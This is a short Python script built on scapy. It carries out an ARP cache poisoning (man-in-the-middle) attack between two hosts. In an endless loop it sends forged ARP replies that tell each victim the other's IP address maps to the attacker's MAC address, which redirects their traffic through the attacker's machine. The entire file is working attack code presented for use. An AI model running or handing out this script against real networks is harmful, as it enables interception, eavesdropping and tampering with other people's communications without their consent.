
from scapy.all import * 
import sys 

if sys.argv[1] == "--help":
    print("Usage: poison.py A_hw A_ip B_hw B_ip M_hw to poison between A and B with your device M")
A_hw = sys.argv[1]
A_ip = sys.argv[2]
B_hw = sys.argv[3]
B_ip = sys.argv[4]
M_hw = sys.argv[5]



while True:
    pkt = ARP(psrc=A_ip, hwsrc=M_hw, pdst=B_ip, hwdst=B_hw, op=2)
    send(pkt)
    pkt = ARP(psrc=B_ip, hwsrc=M_hw, pdst=A_ip, hwdst=A_hw, op=2)
    send(pkt)
